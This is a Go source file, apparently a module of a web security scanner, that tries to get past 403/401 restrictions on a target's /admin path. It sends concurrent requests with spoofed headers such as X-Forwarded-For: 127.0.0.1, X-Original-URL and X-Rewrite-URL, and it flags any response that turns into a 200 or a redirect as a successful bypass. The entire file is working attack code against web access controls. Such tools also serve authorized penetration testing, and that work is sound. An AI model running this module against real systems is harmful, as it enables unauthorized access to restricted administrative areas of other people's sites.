package core

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

type Bypass403Module struct{}

func (m *Bypass403Module) Name() string {
	return "HTTP_403_Bypass"
}

func (m *Bypass403Module) Execute(target string) (interface{}, error) {
	// We append a common restricted directory to test the bypass
	url := "http://" + target + "/admin"

	client := &http.Client{Timeout: 5 * time.Second}

	// Baseline check: Is it actually forbidden?
	baselineReq, _ := http.NewRequest("GET", url, nil)
	baselineResp, err := client.Do(baselineReq)
	if err != nil {
		return nil, err
	}
	defer baselineResp.Body.Close()

	if baselineResp.StatusCode != 403 && baselineResp.StatusCode != 401 {
		return []string{fmt.Sprintf("Target path %s is not returning 403/401 (Status: %d)", url, baselineResp.StatusCode)}, nil
	}

	// Payload headers that often trick load balancers into dropping restrictions
	payloads := map[string]string{
		"X-Forwarded-For":           "127.0.0.1",
		"X-Custom-IP-Authorization": "127.0.0.1",
		"X-Original-URL":            "/admin",
		"X-Rewrite-URL":             "/admin",
		"X-Originating-IP":          "127.0.0.1",
		"X-Host":                    "127.0.0.1",
	}

	findings := make(map[string]string)
	var wg sync.WaitGroup
	var mu sync.Mutex

	for header, value := range payloads {
		wg.Add(1)
		go func(h, v string) {
			defer wg.Done()

			req, _ := http.NewRequest("GET", url, nil)
			req.Header.Set(h, v)

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			// If the status code changes to a success or a redirect, the bypass worked
			if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
				mu.Lock()
				findings[fmt.Sprintf("Header: %s:%s", h, v)] = fmt.Sprintf("Bypass Successful! (Status: %d)", resp.StatusCode)
				mu.Unlock()
			}
		}(header, value)
	}

	wg.Wait()

	if len(findings) == 0 {
		return []string{"No 403 header bypasses successful"}, nil
	}

	return findings, nil
}
